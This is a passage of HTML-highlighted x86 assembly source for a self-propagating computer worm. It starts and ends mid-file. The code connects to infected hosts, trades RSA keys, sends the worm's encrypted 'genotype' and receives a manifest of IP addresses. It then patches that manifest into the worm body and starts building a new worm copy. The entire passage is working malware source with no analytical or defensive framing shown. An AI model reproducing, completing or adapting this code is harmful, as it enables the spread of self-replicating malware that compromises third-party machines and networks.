</span><span class="sc5">spread_the_worm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">heap_emailz</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GEN_SPREADWORM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">activate_gen</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;connect to infected IP</span><span class="sc0">

</span><span class="sc5">connect_worm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socket_address</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc1">;save the IP</span><span class="sc0">

    </span><span class="sc1">;Connect to server and authentificate via RSA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">sizeofsocket</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_connect</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;connect to worm</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">socket_destroy_worm</span><span class="sc0">     </span><span class="sc1">;quit if error</span><span class="sc0">



</span><span class="sc5">got_ip</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">export_key</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">socket_destroy_worm</span><span class="sc0">     </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pubkey_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">protocol_MAGIC</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc5">WORMNET_SENDKEY</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send public key to worm</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response5</span><span class="sc0">           </span><span class="sc1">;get response</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">socket_destroy_worm</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc5">WORMNET_SENDKEY</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">socket_destroy_worm</span><span class="sc0">     </span><span class="sc1">;must be WORMNET_SENDKEY</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">96</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">socket_destroy_worm</span><span class="sc0">     </span><span class="sc1">;key must be &gt; 96 bytez</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">socket_destroy_worm</span><span class="sc0">     </span><span class="sc1">;but &lt; 4096 bytez</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc_memory</span><span class="sc0">            </span><span class="sc1">;allocate memory for new key</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">socket_destroy_worm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">key_mem</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response</span><span class="sc0">            </span><span class="sc1">;recieve public key</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">socket_destroy_worm</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">import_key</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">socket_destroy_worm</span><span class="sc0">     </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">key_mem</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dealloc_memory</span><span class="sc0">          </span><span class="sc1">;deallocate memory</span><span class="sc0">



    </span><span class="sc1">;encrypt worm's genotype and store it in buffer</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MANIFEST.MAN_IPSPTR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">             </span><span class="sc1">;80h = encrypted text block size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">75h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;ECX = plain text block size</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;size of buffer for encryption</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;in ECX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc_memory</span><span class="sc0">            </span><span class="sc1">;allocate memory for buffer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">key_destroy_worm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mem_genotype</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;save address of buffer</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">gen_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">75h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;EBX = plain text block size</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GENOTYPE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;ESI = start of genotype in memory</span><span class="sc0">
</span><span class="sc5">crypt_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">o_crypt_var</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">o_crypt_var</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;copy plaintext over the buffer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">crypt_final</span><span class="sc0">         </span><span class="sc1">;is it last block?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">crypt_final</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_encrypt</span><span class="sc0">           </span><span class="sc1">;encrypt one block</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">gen_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">crypt_loop</span><span class="sc0">          </span><span class="sc1">;correct variablez and continue</span><span class="sc0">



</span><span class="sc1">;encrypt the last block</span><span class="sc0">

</span><span class="sc5">crypt_final</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_encrypt_final</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">gen_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc1">;ECX = size of encrypted genotype</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">protocol_MAGIC</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc5">WORMNET_SENDGENOTYPE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send header to worm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">mem_genotype</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send genotype to worm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dealloc_memory</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response5</span><span class="sc0">           </span><span class="sc1">;get response</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">key_destroy_worm</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc5">WORMNET_SENDMANIFEST</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">key_destroy_worm</span><span class="sc0">        </span><span class="sc1">;must be WORMNET_SENDMANIFEST</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc_memory</span><span class="sc0">            </span><span class="sc1">;allocate memory for manifest</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">key_destroy_worm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mem_manifest</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response</span><span class="sc0">            </span><span class="sc1">;recieve manifest</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">key_destroy_worm</span><span class="sc0">



    </span><span class="sc1">;Decrypt manifest stored in encrypted blocks</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">man_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">decrypt_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;copy encrypted text over the buffer</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">decrypt_final</span><span class="sc0">           </span><span class="sc1">;is it last block?</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_decrypt</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">75h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">man_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">decrypt_loop</span><span class="sc0">            </span><span class="sc1">;correct variablez and continue</span><span class="sc0">



</span><span class="sc1">;decrypt last block</span><span class="sc0">

</span><span class="sc5">decrypt_final</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_decrypt_final</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">man_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;ECX = size of decrypted manifest</span><span class="sc0">


    </span><span class="sc1">;implant new manifest into worm body</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mem_manifest</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc1">;ESI = decrypted manifest</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MANIFEST</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;EDI = address of worm's manifest</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.MAN_IPSPTR</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get pointer to IP storage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.MAN_IPSNUM</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get count of IPs</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;multiply by IP address size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;ECX = size of new manifest</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_manifest</span><span class="sc0">           </span><span class="sc1">;replace old manifest with the new one</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;EAX = size of new manifest</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MANIFEST</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">      </span><span class="sc1">;add size of code placed before the manifest</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virtual_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc1">;correct size of worm body</span><span class="sc0">
    </span><span class="sc1">;create new worm</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@man_size_address</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;1st param - size of manifest</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">12345678h</span><span class="sc0">           </span><span class="sc1">;2nd param - address of manifest</span><span class="sc0">
</span><span class="sc5">mem_manifest</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;3rd param - address of worm</span><span class="sc0">
</span><span class="sc5">@man_size_address</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;EBX = register holding parameters</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">worm_base</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
